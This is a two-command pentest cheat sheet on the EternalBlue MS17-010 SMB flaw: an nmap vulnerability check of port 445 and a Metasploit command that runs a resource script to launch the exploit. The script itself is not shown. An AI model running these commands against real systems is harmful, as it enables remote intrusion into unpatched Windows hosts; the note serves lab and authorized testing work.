# Eternalblue ms17-010

## Check for vuln with nmap script

nmap -p445 --script smb-vuln-ms17-010 xx.xx.xx.xx

## Run eternalblue with metasploit

msfconsole -r ms17_010_eternalblue.rc
